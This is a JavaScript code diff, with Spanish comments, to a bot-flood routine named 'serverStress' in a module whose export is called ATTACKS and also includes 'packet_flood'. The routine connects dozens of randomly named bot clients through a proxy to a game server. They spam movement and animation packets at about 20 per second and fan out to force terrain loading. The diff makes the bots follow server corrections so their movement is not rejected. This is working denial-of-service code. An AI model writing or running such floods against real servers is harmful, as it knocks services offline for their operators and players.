@@ -124,19 +124,30 @@ export async function serverStress(options = {}) {
   const { host, port, version } = { ...DEFAULTS, ...options };
   const bots = options.bots ?? 40;
   const durationMs = (options.durationSec ?? 45) * 1000;
-  const stepBlocks = options.step ?? 6;       // pasos cortos y continuos
+  const stepBlocks = options.step ?? 8;        // bloques por envio (~20/s)
   const deadline = Date.now() + durationMs;
 
   let joined = 0;
   let packets = 0;
+  let alive = 0;
   const start = performance.now();
 
   async function oneBot(index) {
     const username = `stress_${index}_${Math.random().toString(36).slice(2, 6)}`;
     const client = connectThroughProxy({ host, port, version, username });
     client.on('error', () => {});
-    let alive = true;
-    client.once('end', () => { alive = false; });
+    let open = true;
+    client.once('end', () => { open = false; });
+
+    // Posicion real segun el servidor. Se adopta cada correccion (rubber-band,
+    // caida) para seguir en sincronia y que el movimiento no sea rechazado.
+    let pos = null;
+    client.on('position', data => {
+      pos = { x: data.x, y: data.y, z: data.z };
+      if (data.teleportId !== undefined) {
+        try { client.write('teleport_confirm', { teleportId: data.teleportId }); } catch {}
+      }
+    });
 
     try {
       await awaitPlay(client, 25_000);
@@ -145,30 +156,39 @@ export async function serverStress(options = {}) {
     }
     joined++;
 
+    // Espera a conocer la posicion del spawn antes de moverse.
+    const until = Date.now() + 5_000;
+    while (open && pos === null && Date.now() < until) {
+      await new Promise(r => setTimeout(r, 50));
+    }
+    if (pos === null) pos = { x: 0, y: 80, z: 0 };
+
+    // Cada bot explora en una direccion distinta, repartidos en circulo.
+    const angle = (index / bots) * 2 * Math.PI;
+    const dirX = Math.cos(angle);
+    const dirZ = Math.sin(angle);
     const flags = { onGround: true, hasHorizontalCollision: false };
-    let x = (index - bots / 2) * 512;          // cada bot en una franja distinta
-    let z = 0;
-    // Bucle de carga: avanza y spamea hasta el tiempo limite.
-    while (alive && Date.now() < deadline) {
-      z += stepBlocks;
+
+    while (open && Date.now() < deadline) {
+      pos.x += dirX * stepBlocks;              // avanza desde la posicion real
+      pos.z += dirZ * stepBlocks;
       try {
-        client.write('position', { x, y: 80, z, flags });
+        client.write('position', { x: pos.x, y: pos.y, z: pos.z, flags });
         client.write('arm_animation', { hand: 'main_hand' });
-        client.write('block_dig', { status: 0, location: { x: Math.floor(x), y: 79, z: Math.floor(z) }, face: 1, sequence: 0 });
-        packets += 3;
+        packets += 2;
       } catch {
         break;
       }
-      // ~20 iteraciones por segundo, como un cliente real a tope.
       await new Promise(r => setTimeout(r, 50));
     }
-    if (alive) client.end('fin del estres');
+    if (open) { alive++; client.end('fin del estres'); }
   }
 
   await Promise.all(Array.from({ length: bots }, (_, i) => oneBot(i)));
   const elapsedMs = Math.round(performance.now() - start);
-  return { attack: 'server_stress', bots, joined, packets, elapsedMs, sent: packets };
+  return { attack: 'server_stress', bots, joined, vivosAlFinal: alive, packets, elapsedMs, sent: packets };
 }
+
 
 export const ATTACKS = {
   packet_flood: packetFlood,
